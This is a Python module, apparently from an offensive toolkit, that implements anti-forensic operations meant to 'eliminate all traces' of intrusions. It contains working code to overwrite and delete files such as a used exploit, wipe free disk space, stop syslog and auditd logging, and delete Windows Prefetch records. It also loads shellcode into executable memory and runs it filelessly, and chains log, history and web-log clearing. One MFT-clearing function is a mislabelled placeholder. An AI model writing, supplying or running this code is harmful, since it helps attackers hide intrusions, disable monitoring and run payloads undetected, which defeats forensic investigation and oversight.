"""
KRYON Evasion - Advanced Anti-Forensic Techniques

Advanced anti-forensic operations and evidence destruction.

Clearance Level: Alpha-Black (Anti-Forensic Operations Authority)
Specialization: Evidence destruction and forensic countermeasures
Mission: Eliminate all traces of KRYON operations

This module provides:
- Secure file deletion with overwriting
- Free space wiping
- Memory-only execution
- MFT entry manipulation (Windows)
- Prefetch clearing
- Forensic artifact removal
"""

import os
import random
import subprocess
from typing import Any, Optional


def secure_delete_file(file_path: str, overwrite_passes: int = 3, method: str = "random") -> dict[str, Any]:
    """
    Securely delete file with multiple overwrite passes.

    Prevents file recovery using forensic tools.

    Overwrite Methods:
    - random: Random data (DoD 5220.22-M standard)
    - zeros: All zeros
    - ones: All ones
    - gutmann: Gutmann 35-pass method (overkill)

    Args:
        file_path: File to securely delete
        overwrite_passes: Number of overwrite passes (3-7 recommended)
        method: Overwrite method (random, zeros, ones, gutmann)

    Returns:
        Dictionary with deletion status

    Example:
        >>> # Securely delete exploit after use
        >>> result = secure_delete_file(
        ...     file_path="/tmp/exploit.elf",
        ...     overwrite_passes=7,
        ...     method="random"
        ... )
        >>>
        >>> print(f"File securely deleted: {result['success']}")
        >>> print(f"Overwrite passes: {result['passes_completed']}")

    Why Secure Deletion:
        - rm/del only removes directory entry
        - File content remains on disk
        - Forensic tools can recover deleted files
        - Overwriting prevents recovery
    """
    results = {"passes_completed": 0, "file_size": 0, "success": False, "error": None}

    try:
        if not os.path.exists(file_path):
            results["error"] = f"File not found: {file_path}"
            return results

        # Get file size
        file_size = os.path.getsize(file_path)
        results["file_size"] = file_size

        # Perform overwrite passes
        for pass_num in range(overwrite_passes):
            with open(file_path, "r+b") as f:
                if method == "random":
                    # Write random bytes
                    data = bytes([random.randint(0, 255) for _ in range(file_size)])
                elif method == "zeros":
                    data = b"\x00" * file_size
                elif method == "ones":
                    data = b"\xff" * file_size
                elif method == "gutmann":
                    # Simplified Gutmann pattern
                    patterns = [b"\x00", b"\xff", b"\xaa", b"\x55"]
                    data = patterns[pass_num % len(patterns)] * file_size
                else:
                    data = bytes([random.randint(0, 255) for _ in range(file_size)])

                f.seek(0)
                f.write(data)
                f.flush()
                os.fsync(f.fileno())

            results["passes_completed"] += 1

        # Finally, delete the file
        os.remove(file_path)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def wipe_free_space(drive_path: str = "/", method: str = "zeros", max_size_mb: Optional[int] = None) -> dict[str, Any]:
    """
    Wipe free space on drive to prevent recovery of deleted files.

    Creates large file filled with zeros/random data to overwrite
    free space where deleted files were stored.

    Args:
        drive_path: Drive or partition to wipe (e.g., "/", "C:\\")
        method: Overwrite method (zeros, random)
        max_size_mb: Maximum size to write (None = fill all free space)

    Returns:
        Dictionary with wipe statistics

    Example:
        >>> # Wipe 1GB of free space on /tmp
        >>> result = wipe_free_space(
        ...     drive_path="/tmp",
        ...     method="zeros",
        ...     max_size_mb=1024
        ... )
        >>>
        >>> print(f"Wiped {result['bytes_written']} bytes")

    Warning:
        - Takes significant time
        - May fill disk temporarily
        - Use max_size_mb to limit impact
    """
    results = {"bytes_written": 0, "success": False, "error": None}

    try:
        import shutil

        # Get free space
        stat = shutil.disk_usage(drive_path)
        free_space = stat.free

        # Determine how much to write
        if max_size_mb:
            max_bytes = max_size_mb * 1024 * 1024
            bytes_to_write = min(free_space - (100 * 1024 * 1024), max_bytes)  # Leave 100MB
        else:
            bytes_to_write = free_space - (100 * 1024 * 1024)  # Leave 100MB

        if bytes_to_write <= 0:
            results["error"] = "Not enough free space"
            return results

        # Create wipe file
        wipe_file = os.path.join(drive_path, ".skynet_wipe_tmp")

        # Write in chunks
        chunk_size = 1024 * 1024  # 1MB chunks
        bytes_written = 0

        with open(wipe_file, "wb") as f:
            while bytes_written < bytes_to_write:
                chunk_bytes = min(chunk_size, bytes_to_write - bytes_written)

                if method == "zeros":
                    chunk = b"\x00" * chunk_bytes
                else:  # random
                    chunk = bytes([random.randint(0, 255) for _ in range(chunk_bytes)])

                f.write(chunk)
                bytes_written += chunk_bytes

        results["bytes_written"] = bytes_written

        # Delete wipe file
        os.remove(wipe_file)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)
        # Try to clean up wipe file
        try:
            wipe_file = os.path.join(drive_path, ".skynet_wipe_tmp")
            if os.path.exists(wipe_file):
                os.remove(wipe_file)
        except Exception:
            pass

    return results


def disable_logging_temporarily(service: str = "syslog", duration_seconds: int = 300) -> dict[str, Any]:
    """
    Temporarily disable system logging during operations.

    Args:
        service: Logging service to disable (syslog, rsyslog, auditd)
        duration_seconds: How long to disable (auto re-enables)

    Returns:
        Success status and process info

    Example:
        >>> # Disable syslog for 5 minutes
        >>> result = disable_logging_temporarily(
        ...     service="rsyslog",
        ...     duration_seconds=300
        ... )
        >>>
        >>> # Perform operations here
        >>> # ... operations ...
        >>>
        >>> # Logging will auto-restart after duration

    Warning:
        - Very suspicious if monitored
        - May trigger alerts
        - Use with caution
    """
    results = {
        "service_stopped": False,
        "restart_scheduled": False,
        "success": False,
        "error": None,
    }

    try:
        # Stop logging service
        stop_result = subprocess.run(["systemctl", "stop", service], capture_output=True, text=True)

        if stop_result.returncode == 0:
            results["service_stopped"] = True

            # Schedule restart
            subprocess.Popen(
                f"sleep {duration_seconds} && systemctl start {service}",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            results["restart_scheduled"] = True
            results["success"] = True
        else:
            results["error"] = f"Failed to stop {service}: {stop_result.stderr}"

    except Exception as e:
        results["error"] = str(e)

    return results


def memory_only_execution(payload_bytes: bytes, execute: bool = False) -> dict[str, Any]:
    """
    Load and optionally execute payload from memory (fileless).

    Advantages:
    - No file on disk
    - Harder to detect
    - No forensic artifacts
    - Bypasses file-based security

    Args:
        payload_bytes: Payload bytecode
        execute: Whether to actually execute (dangerous!)

    Returns:
        Execution result

    Example:
        >>> # Load shellcode in memory
        >>> shellcode = b"\\x90\\x90\\x90..."
        >>> result = memory_only_execution(
        ...     payload_bytes=shellcode,
        ...     execute=False  # Set True to actually execute
        ... )

    Warning:
        - Extremely dangerous
        - Can execute arbitrary code
        - No safety checks
        - Use at your own risk
    """
    results = {
        "loaded_in_memory": False,
        "executed": False,
        "memory_address": None,
        "success": False,
        "error": None,
    }

    try:
        # Allocate memory
        import ctypes

        # Platform-specific memory allocation
        if os.name == "nt":  # Windows
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(
                None,
                len(payload_bytes),
                0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
                0x40,  # PAGE_EXECUTE_READWRITE
            )
        else:  # Linux
            libc = ctypes.CDLL("libc.so.6")
            ptr = libc.valloc(len(payload_bytes))
            libc.mprotect(ptr, len(payload_bytes), 7)  # RWX permissions

        if not ptr:
            results["error"] = "Failed to allocate memory"
            return results

        results["memory_address"] = hex(ptr)

        # Copy payload to allocated memory
        ctypes.memmove(ptr, payload_bytes, len(payload_bytes))
        results["loaded_in_memory"] = True

        # Execute if requested
        if execute:
            # Cast memory to function and execute
            func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)
            func()
            results["executed"] = True

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def clear_prefetch_windows() -> dict[str, Any]:
    """
    Clear Windows Prefetch to hide program execution history.

    Prefetch stores information about programs executed, including:
    - Executable name
    - Execution times
    - File paths accessed

    Returns:
        Number of prefetch files cleared

    Example:
        >>> result = clear_prefetch_windows()
        >>> print(f"Cleared {result['files_cleared']} prefetch files")
    """
    results = {"files_cleared": 0, "success": False, "error": None}

    try:
        import glob

        prefetch_path = r"C:\Windows\Prefetch"

        if not os.path.exists(prefetch_path):
            results["error"] = "Prefetch directory not found"
            return results

        # Delete all .pf files
        for pf_file in glob.glob(os.path.join(prefetch_path, "*.pf")):
            try:
                os.remove(pf_file)
                results["files_cleared"] += 1
            except Exception:
                pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def clear_mft_entries_windows(file_paths: list[str]) -> dict[str, Any]:
    """
    Attempt to clear MFT entries for deleted files (Windows).

    MFT (Master File Table) stores file metadata. Even after deletion,
    MFT entries can reveal file existence.

    Args:
        file_paths: List of files to clear from MFT (already deleted)

    Returns:
        Status of MFT clearing

    Example:
        >>> # After securely deleting files
        >>> files = ["/path/to/deleted1.exe", "/path/to/deleted2.dll"]
        >>> result = clear_mft_entries_windows(files)

    Note:
        - Requires admin privileges
        - Not always successful
        - MFT manipulation is complex
    """
    results = {"entries_cleared": 0, "success": False, "error": None}

    try:
        # This is a simplified placeholder
        # Real MFT manipulation is very complex and risky
        # Would require low-level disk access

        # For now, just wipe free space which may help
        for file_path in file_paths:
            drive = os.path.splitdrive(file_path)[0] + "\\"
            # Wipe small amount of free space
            wipe_result = wipe_free_space(drive, max_size_mb=10)
            if wipe_result["success"]:
                results["entries_cleared"] += 1

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def anti_forensic_cleanup_complete(target_directory: str = "/", comprehensive: bool = True) -> dict[str, Any]:
    """
    Comprehensive anti-forensic cleanup operation.

    Executes all anti-forensic measures:
    1. Clean logs
    2. Remove command histories
    3. Clear web logs
    4. Wipe free space
    5. Clear prefetch (Windows)
    6. Timestomp recent files

    Args:
        target_directory: Root directory for operations
        comprehensive: Perform all steps vs basic cleanup

    Returns:
        Summary of all operations

    Example:
        >>> # Complete cleanup after operation
        >>> result = anti_forensic_cleanup_complete(
        ...     target_directory="/",
        ...     comprehensive=True
        ... )
        >>>
        >>> print(f"Logs cleaned: {result['logs_cleaned']}")
        >>> print(f"Free space wiped: {result['free_space_wiped_mb']} MB")
        >>> print(f"Files timestomped: {result['files_timestomped']}")
    """
    results = {
        "logs_cleaned": 0,
        "histories_removed": 0,
        "web_logs_cleared": 0,
        "free_space_wiped_mb": 0,
        "prefetch_cleared": 0,
        "files_timestomped": 0,
        "operations_completed": [],
        "success": False,
        "error": None,
    }

    try:
        from skynet.tools.evasion import (
            clean_linux_logs,
            clean_windows_logs,
            clear_web_logs,
            remove_command_history,
        )

        # 1. Clean logs
        if os.name != "nt":  # Linux
            log_result = clean_linux_logs(comprehensive=comprehensive)
            results["logs_cleaned"] = log_result.get("logs_cleaned", 0)
            results["operations_completed"].append("linux_logs")
        else:  # Windows
            log_result = clean_windows_logs()
            results["logs_cleaned"] = log_result.get("logs_cleaned", 0)
            results["operations_completed"].append("windows_logs")

        # 2. Remove command histories
        hist_result = remove_command_history()
        results["histories_removed"] = hist_result.get("histories_removed", 0)
        results["operations_completed"].append("command_history")

        # 3. Clear web logs
        web_result = clear_web_logs()
        results["web_logs_cleared"] = web_result.get("logs_cleared", 0)
        results["operations_completed"].append("web_logs")

        # 4. Wipe free space (if comprehensive)
        if comprehensive:
            wipe_result = wipe_free_space(
                drive_path=target_directory,
                max_size_mb=100,  # Limit to 100MB
            )
            results["free_space_wiped_mb"] = wipe_result.get("bytes_written", 0) // (1024 * 1024)
            results["operations_completed"].append("free_space_wipe")

        # 5. Clear prefetch (Windows only)
        if os.name == "nt":
            prefetch_result = clear_prefetch_windows()
            results["prefetch_cleared"] = prefetch_result.get("files_cleared", 0)
            results["operations_completed"].append("prefetch")

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
